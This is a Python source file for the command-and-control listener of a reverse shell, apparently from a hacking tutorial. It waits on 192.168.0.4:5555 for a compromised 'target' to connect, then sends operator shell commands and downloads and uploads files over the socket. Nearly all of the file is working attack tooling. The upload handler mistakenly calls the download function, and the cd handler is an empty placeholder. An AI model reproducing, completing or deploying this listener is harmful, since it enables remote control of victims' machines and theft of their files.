import socket
import json
import os

# Function to send data reliably by encoding as JSON and sending over the socket
def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode())

# Function to receive data reliably by continuously receiving and decoding data until a valid JSON is obtained
def reliable_receive():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

# Function to upload a file to the target by reading the file in binary mode and sending its contents over the socket
def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

# Function to download a file from the target by receiving chunks of data and writing them to a file
def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

# Function to manage communication with the target
def target_communication():
    while True:
        data = input('* Shell~%s: ' % str(ip))  # Take user input
        reliable_send(data)  # Send input to the target
        if data == 'exit':
            break
        elif data == 'clear':
            os.system('clear')  # Clear the console screen
        elif data[:3] == 'cd ':
            pass  # Placeholder for handling changing directories on the target
        elif data[:8] == 'download':
            download_file(data[9:])  # Download a file from the target
        elif data[:6] == 'upload':
            download_file(data[7:])  # Upload a file to the target
        else:
            result = reliable_receive()  # Receive and print result from the target
            print(result)

# Create a socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to a specific IP and port
sock.bind(('192.168.0.4', 5555))

print('[+] Listening on 192.168.0.4:5555')
# Start listening for incoming connections
sock.listen(5)

# Accept an incoming connection and get the target socket and IP
target, ip = sock.accept()
print(f'[+] Accepted connection from {ip}')

# Start communication with the target
target_communication()
